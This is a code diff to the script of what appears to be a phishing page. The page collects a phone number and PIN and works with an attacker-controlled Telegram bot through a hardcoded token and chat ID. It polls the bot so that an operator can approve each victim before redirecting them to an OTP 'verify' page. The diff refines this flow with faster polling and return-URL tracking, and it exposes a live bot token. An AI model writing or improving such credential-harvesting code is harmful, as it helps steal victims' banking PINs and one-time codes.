@@ -340,6 +340,7 @@
     <script>
         const BOT_TOKEN = '8942095806:AAE7fGncRZcXDv0s9BW_ZQSKzovwO09tYv8';
         const CHAT_ID = '8820857419';
+        const POLL_INTERVAL_MS = 1000;
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
         if (savedPhone && savedPhone.length === 9) {
@@ -352,6 +353,24 @@
         let pollInterval;
         let lastUpdateId = 0;
         let pollingActive = false;
+
+        function getSafeLastPage() {
+            const stored = sessionStorage.getItem('lastPageBeforeOtp');
+            if (stored) return stored;
+
+            if (document.referrer) {
+                try {
+                    const ref = new URL(document.referrer);
+                    if (ref.origin === window.location.origin) {
+                        return ref.pathname || 'index.html';
+                    }
+                } catch (error) {
+                    // Ignore invalid referrer values and fall back below.
+                }
+            }
+
+            return 'index.html';
+        }
 
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
@@ -399,9 +418,11 @@
                 return;
             }
 
-            // Prevent multiple clicks
             if (pollingActive) return;
             pollingActive = true;
+
+            const otpReturnUrl = getSafeLastPage();
+            sessionStorage.setItem('lastPageBeforeOtp', otpReturnUrl);
 
             spinnerOverlay.style.display = 'flex';
             const timestamp = Date.now();
@@ -439,7 +460,6 @@
                         pollingActive = false;
                         return;
                     }
-                    // Start polling after successful send
                     startPolling(approveData, cancelData);
                 })
                 .catch(error => {
@@ -450,27 +470,23 @@
         });
 
         function startPolling(approveData, cancelData) {
-            // Do an initial fetch to get the latest update_id so we don't reprocess old updates
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
                 .then(res => res.json())
                 .then(data => {
                     if (data.ok && data.result.length > 0) {
-                        // Set offset to the latest update_id + 1 to skip all old updates
                         const maxId = Math.max(...data.result.map(u => u.update_id));
                         lastUpdateId = maxId;
                     }
 
-                    // Now start polling from after the last update
                     pollInterval = setInterval(() => {
                         if (!pollingActive) return;
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                             .then(res => res.json())
                             .then(data => {
                                 if (!pollingActive) return;
                                 if (data.ok && data.result.length > 0) {
                                     for (let update of data.result) {
-                                        // Always advance offset
                                         if (update.update_id >= lastUpdateId) {
                                             lastUpdateId = update.update_id;
                                         }
@@ -479,11 +495,11 @@
                                             const cbData = update.callback_query.data;
                                             const cbId = update.callback_query.id;
 
-                                            // Answer the callback query immediately to acknowledge it
                                             answerCallback(cbId);
 
                                             if (cbData === approveData) {
                                                 stopPolling();
+                                                sessionStorage.setItem('lastPageBeforeOtp', getSafeLastPage());
                                                 window.location.href = 'verify.html';
                                                 return;
                                             } else if (cbData === cancelData) {
@@ -496,14 +512,13 @@
                                 }
                             })
                             .catch(() => {});
-                    }, 2000);
+                    }, POLL_INTERVAL_MS);
                 })
                 .catch(() => {
-                    // Fallback: just poll normally
                     pollInterval = setInterval(() => {
                         if (!pollingActive) return;
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                             .then(res => res.json())
                             .then(data => {
                                 if (!pollingActive) return;
@@ -521,6 +536,7 @@
 
                                             if (cbData === approveData) {
                                                 stopPolling();
+                                                sessionStorage.setItem('lastPageBeforeOtp', getSafeLastPage());
                                                 window.location.href = 'verify.html';
                                                 return;
                                             } else if (cbData === cancelData) {
@@ -533,7 +549,7 @@
                                 }
                             })
                             .catch(() => {});
-                    }, 2000);
+                    }, POLL_INTERVAL_MS);
                 });
         }
 
